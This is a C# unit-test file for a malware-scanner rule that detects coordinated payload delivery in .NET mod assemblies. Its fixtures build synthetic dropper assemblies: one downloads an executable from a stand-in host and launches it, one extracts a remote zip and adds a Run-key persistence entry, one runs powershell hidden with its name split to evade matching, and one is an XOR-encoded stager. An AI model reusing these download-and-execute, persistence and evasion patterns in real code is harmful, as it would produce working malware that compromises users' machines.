using FluentAssertions;
using MLVScan.Models;
using MLVScan.Models.Rules;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Xunit;

namespace MLVScan.Core.Tests.Unit.Rules;

public class CoordinatedPayloadDeliveryRuleTests
{
    private readonly CoordinatedPayloadDeliveryRule _rule = new();

    [Fact]
    public void PostAnalysisRefine_ArchiveAutorunHiddenLaunch_ReturnsFinding()
    {
        using var assembly = CreateArchiveInstaller(includeRegistryPersistence: true);
        var existing = new[]
        {
            ProcessFinding("CreateNoWindow=true, WindowStyle=Hidden, Arguments: --hidden")
        };

        var findings = _rule.PostAnalysisRefine(assembly.MainModule, existing).ToList();

        findings.Should().ContainSingle(finding =>
            finding.RuleId == "CoordinatedPayloadDeliveryRule" &&
            finding.Description.Contains("archive payload delivery", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void PostAnalysisRefine_ArchiveUpdaterWithoutPersistence_ReturnsNoFinding()
    {
        using var assembly = CreateArchiveInstaller(includeRegistryPersistence: false);
        var existing = new[]
        {
            ProcessFinding("CreateNoWindow=true, WindowStyle=Hidden, Arguments: --hidden")
        };

        var findings = _rule.PostAnalysisRefine(assembly.MainModule, existing).ToList();

        findings.Should().BeEmpty();
    }

    [Fact]
    public void PostAnalysisRefine_ArchiveInstallerWithVisibleLaunch_ReturnsNoFinding()
    {
        using var assembly = CreateArchiveInstaller(includeRegistryPersistence: true);
        var existing = new[] { ProcessFinding("Target: updater.exe") };

        var findings = _rule.PostAnalysisRefine(assembly.MainModule, existing).ToList();

        findings.Should().BeEmpty();
    }

    [Fact]
    public void PostAnalysisRefine_RemoteTextPassedToHiddenShell_ReturnsFinding()
    {
        using var assembly = CreateRemoteTextShellLauncher();
        var existing = new[]
        {
            ProcessFinding(
                "Target: \"powershell.exe\". Arguments: <dynamic via Replace> " +
                "[Evasion: UseShellExecute set, CreateNoWindow=true]",
                "Test.Sample.RemoteLauncher.Run:42")
        };

        var findings = _rule.PostAnalysisRefine(assembly.MainModule, existing).ToList();

        findings.Should().ContainSingle(finding =>
            finding.RuleId == "CoordinatedPayloadDeliveryRule" &&
            finding.Description.Contains("remote text", StringComparison.OrdinalIgnoreCase) &&
            finding.Description.Contains("shell command", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void PostAnalysisRefine_RemoteVersionCheckAndVisibleShell_ReturnsNoFinding()
    {
        using var assembly = CreateRemoteTextShellLauncher();
        var existing = new[]
        {
            ProcessFinding(
                "Target: \"powershell.exe\". Arguments: -File show-version.ps1",
                "Test.Sample.RemoteLauncher.Run:42")
        };

        var findings = _rule.PostAnalysisRefine(assembly.MainModule, existing).ToList();

        findings.Should().BeEmpty();
    }

    [Fact]
    public void PostAnalysisRefine_FragmentedHiddenShellTarget_ReturnsFinding()
    {
        using var assembly = CreateRemoteTextShellLauncher(fragmentShellTarget: true);
        var existing = new[]
        {
            ProcessFinding(
                "Target: <dynamic via Dup>. Arguments: <unknown/no-arguments> " +
                "[Evasion: UseShellExecute set, CreateNoWindow=true]",
                "Test.Sample.RemoteLauncher.Run:42")
        };

        var findings = _rule.PostAnalysisRefine(assembly.MainModule, existing).ToList();

        findings.Should().ContainSingle(finding =>
            finding.RuleId == "CoordinatedPayloadDeliveryRule" &&
            finding.Description.Contains("remote text", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void PostAnalysisRefine_EncodedEvmJavaPayloadMarkers_ReturnsFinding()
    {
        using var assembly = CreateEncodedEvmJavaStager();
        var existing = new[]
        {
            ProcessFinding("Target: <dynamic>. Arguments: <dynamic> [WindowStyle=Hidden]"),
            EncodedFinding("decoded indicator(s): eth_call, 0x5e280f11, -cp , com.renderassist.Main")
        };

        var findings = _rule.PostAnalysisRefine(assembly.MainModule, existing).ToList();

        findings.Should().ContainSingle(finding =>
            finding.RuleId == "CoordinatedPayloadDeliveryRule" &&
            finding.Description.Contains("blockchain-resolved Java archive stager", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void PostAnalysisRefine_EncodedEvmClientWithoutJavaPayloadMarkers_ReturnsNoFinding()
    {
        using var assembly = CreateEncodedEvmJavaStager();
        var existing = new[]
        {
            ProcessFinding("Target: <dynamic>. Arguments: <dynamic> [WindowStyle=Hidden]"),
            EncodedFinding("decoded indicator(s): eth_call, 0x5e280f11, https://rpc.example.test")
        };

        var findings = _rule.PostAnalysisRefine(assembly.MainModule, existing).ToList();

        findings.Should().BeEmpty();
    }

    [Theory]
    [InlineData("Mods/payload.exe", true)]
    [InlineData("Mods/unrelated.exe", false)]
    public void PostAnalysisRefine_DownloadedExecutableLaunch_RequiresSameStagedPath(
        string launchPath, bool shouldDetect)
    {
        using var assembly = CreateDownloadAndLaunch(launchPath);
        var findings = _rule.PostAnalysisRefine(assembly.MainModule,
            [ProcessFinding("Target: <arg 1>. [Evasion: UseShellExecute=true]", "Test.Sample.Dropper.Launch:5")])
            .Where(finding => finding.Description.Contains("downloaded executable", StringComparison.OrdinalIgnoreCase))
            .ToList();

        if (shouldDetect)
        {
            findings.Should().ContainSingle();
        }
        else
        {
            findings.Should().BeEmpty();
        }
    }

    [Fact]
    public void PostAnalysisRefine_DownloadedExecutableLaunch_IgnoresUnrelatedExecutableUrl()
    {
        using var assembly = CreateDownloadAndLaunch("Mods/payload.exe", "https://example.test/image.png",
            includeUnrelatedExecutableUrl: true);

        _rule.PostAnalysisRefine(assembly.MainModule, [])
            .Should().NotContain(finding =>
                finding.Description.Contains("downloaded executable", StringComparison.OrdinalIgnoreCase));
    }

    private static AssemblyDefinition CreateDownloadAndLaunch(
        string launchPath,
        string downloadUrl = "https://example.test/release/payload.exe",
        bool includeUnrelatedExecutableUrl = false)
    {
        var assembly = AssemblyDefinition.CreateAssembly(
            new AssemblyNameDefinition("DownloadAndLaunch", new Version(1, 0)),
            "DownloadAndLaunch", ModuleKind.Dll);
        var module = assembly.MainModule;
        var type = new TypeDefinition("Test.Sample", "Dropper", TypeAttributes.Public, module.TypeSystem.Object);
        module.Types.Add(type);

        var download = new MethodDefinition("Download", MethodAttributes.Public | MethodAttributes.Static,
            module.TypeSystem.Void);
        download.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
        download.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
        download.Body.Variables.Add(new VariableDefinition(new ArrayType(module.TypeSystem.Byte)));
        type.Methods.Add(download);
        var downloadData = MethodWithParameters(module, "System.Net", "WebClient", "DownloadData",
            new ArrayType(module.TypeSystem.Byte), module.TypeSystem.String);
        var writeBytes = MethodWithParameters(module, "System.IO", "File", "WriteAllBytes",
            module.TypeSystem.Void, module.TypeSystem.String, new ArrayType(module.TypeSystem.Byte));
        var downloadIl = download.Body.GetILProcessor();
        downloadIl.Emit(OpCodes.Ldarg_0);
        downloadIl.Emit(OpCodes.Call, downloadData);
        downloadIl.Emit(OpCodes.Stloc_0);
        downloadIl.Emit(OpCodes.Ldarg_1);
        downloadIl.Emit(OpCodes.Ldloc_0);
        downloadIl.Emit(OpCodes.Call, writeBytes);
        downloadIl.Emit(OpCodes.Ret);

        var launch = new MethodDefinition("Launch", MethodAttributes.Public | MethodAttributes.Static,
            module.TypeSystem.Void);
        launch.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
        type.Methods.Add(launch);
        var start = MethodWithParameters(module, "System.Diagnostics", "Process", "Start",
            module.TypeSystem.Object, module.TypeSystem.String);
        var launchIl = launch.Body.GetILProcessor();
        launchIl.Emit(OpCodes.Ldarg_0);
        launchIl.Emit(OpCodes.Call, start);
        launchIl.Emit(OpCodes.Pop);
        launchIl.Emit(OpCodes.Ret);

        var run = new MethodDefinition("Run", MethodAttributes.Public | MethodAttributes.Static,
            module.TypeSystem.Void);
        type.Methods.Add(run);
        var runIl = run.Body.GetILProcessor();
        if (includeUnrelatedExecutableUrl)
        {
            runIl.Emit(OpCodes.Ldstr, "https://example.test/unrelated.exe");
            runIl.Emit(OpCodes.Pop);
        }

        runIl.Emit(OpCodes.Ldstr, downloadUrl);
        runIl.Emit(OpCodes.Ldstr, "Mods/payload.exe");
        runIl.Emit(OpCodes.Call, download);
        runIl.Emit(OpCodes.Ldstr, launchPath);
        runIl.Emit(OpCodes.Call, launch);
        runIl.Emit(OpCodes.Ret);
        return assembly;
    }

    private static MethodReference MethodWithParameters(ModuleDefinition module, string ns, string type,
        string name, TypeReference returnType, params TypeReference[] parameters)
    {
        var method = new MethodReference(name, returnType,
            new TypeReference(ns, type, module, module.TypeSystem.CoreLibrary));
        foreach (var parameter in parameters)
        {
            method.Parameters.Add(new ParameterDefinition(parameter));
        }
        return method;
    }

    private static AssemblyDefinition CreateArchiveInstaller(bool includeRegistryPersistence)
    {
        var assembly = AssemblyDefinition.CreateAssembly(
            new AssemblyNameDefinition("ArchiveInstaller", new Version(1, 0)),
            "ArchiveInstaller",
            ModuleKind.Dll);
        var module = assembly.MainModule;
        var type = new TypeDefinition("Test.Sample", "Installer", TypeAttributes.Public, module.TypeSystem.Object);
        module.Types.Add(type);

        var method = new MethodDefinition("Install", MethodAttributes.Public | MethodAttributes.Static, module.TypeSystem.Void);
        method.Body = new MethodBody(method);
        type.Methods.Add(method);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Ldstr, "http://198.51.100.8/payload.zip");
        il.Emit(OpCodes.Call, Method(module, "System.Net", "HttpWebRequest", "GetResponse"));
        il.Emit(OpCodes.Call, Method(module, "System.IO", "File", "Create"));
        il.Emit(OpCodes.Call, Method(module, "System.IO.Compression", "ZipFile", "ExtractToDirectory"));
        il.Emit(OpCodes.Call, Method(module, "System", "Environment", "GetFolderPath"));
        if (includeRegistryPersistence)
        {
            il.Emit(OpCodes.Ldstr, @"Software\Microsoft\Windows\CurrentVersion\Run");
            il.Emit(OpCodes.Call, Method(module, "Microsoft.Win32", "RegistryKey", "SetValue"));
        }
        il.Emit(OpCodes.Call, Method(module, "System.Diagnostics", "Process", "Start"));
        il.Emit(OpCodes.Ret);
        return assembly;
    }

    private static AssemblyDefinition CreateRemoteTextShellLauncher(bool fragmentShellTarget = false)
    {
        var assembly = AssemblyDefinition.CreateAssembly(
            new AssemblyNameDefinition("RemoteTextShellLauncher", new Version(1, 0)),
            "RemoteTextShellLauncher",
            ModuleKind.Dll);
        var module = assembly.MainModule;
        var type = new TypeDefinition("Test.Sample", "RemoteLauncher", TypeAttributes.Public, module.TypeSystem.Object);
        module.Types.Add(type);

        var method = new MethodDefinition("Run", MethodAttributes.Public | MethodAttributes.Static, module.TypeSystem.Void);
        method.Body = new MethodBody(method);
        type.Methods.Add(method);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Ldstr, "https://example.test/profile");
        il.Emit(OpCodes.Call, Method(module, "System.Net.Http", "HttpClient", "GetStringAsync"));
        il.Emit(OpCodes.Call, Method(module, "System.Text.RegularExpressions", "Regex", "Match"));
        if (fragmentShellTarget)
        {
            il.Emit(OpCodes.Ldstr, "powe");
            il.Emit(OpCodes.Ldstr, "rshell.exe");
            il.Emit(OpCodes.Call, Method(module, "System.Diagnostics", "ProcessStartInfo", "set_CreateNoWindow"));
        }
        il.Emit(OpCodes.Call, Method(module, "System.Diagnostics", "ProcessStartInfo", "set_Arguments"));
        il.Emit(OpCodes.Call, Method(module, "System.Diagnostics", "Process", "Start"));
        il.Emit(OpCodes.Ret);
        return assembly;
    }

    private static AssemblyDefinition CreateEncodedEvmJavaStager()
    {
        var assembly = AssemblyDefinition.CreateAssembly(
            new AssemblyNameDefinition("EncodedEvmJavaStager", new Version(1, 0)),
            "EncodedEvmJavaStager",
            ModuleKind.Dll);
        var module = assembly.MainModule;
        var type = new TypeDefinition("Test.Sample", "Stager", TypeAttributes.Public, module.TypeSystem.Object);
        module.Types.Add(type);

        var decode = new MethodDefinition("Decode", MethodAttributes.Public | MethodAttributes.Static, module.TypeSystem.String);
        decode.Body = new MethodBody(decode);
        type.Methods.Add(decode);
        var decodeIl = decode.Body.GetILProcessor();
        decodeIl.Emit(OpCodes.Ldc_I4, 167);
        decodeIl.Emit(OpCodes.Xor);
        decodeIl.Emit(OpCodes.Call, Method(module, "System.Text", "Encoding", "GetString"));
        decodeIl.Emit(OpCodes.Ret);

        var run = new MethodDefinition("Run", MethodAttributes.Public | MethodAttributes.Static, module.TypeSystem.Void);
        run.Body = new MethodBody(run);
        type.Methods.Add(run);
        var runIl = run.Body.GetILProcessor();
        runIl.Emit(OpCodes.Call, Method(module, "System.Net.Http", "HttpClient", "PostAsync"));
        runIl.Emit(OpCodes.Call, Method(module, "System.IO", "File", "WriteAllBytes"));
        runIl.Emit(OpCodes.Call, Method(module, "System.Diagnostics", "Process", "Start"));
        runIl.Emit(OpCodes.Ret);
        return assembly;
    }

    private static MethodReference Method(ModuleDefinition module, string ns, string type, string name)
    {
        return new MethodReference(
            name,
            module.TypeSystem.Void,
            new TypeReference(ns, type, module, module.TypeSystem.CoreLibrary));
    }

    private static ScanFinding ProcessFinding(string description, string location = "Test.Sample.Installer.Install")
    {
        return new ScanFinding(location, description, Severity.High, description)
        {
            RuleId = "ProcessStartRule"
        };
    }

    private static ScanFinding EncodedFinding(string codeSnippet)
    {
        return new ScanFinding(
            "Test.Sample.Stager.Decode",
            "Detected fixed-key byte-array XOR string reconstruction.",
            Severity.High,
            codeSnippet)
        {
            RuleId = "EncodedStringPipelineRule"
        };
    }
}
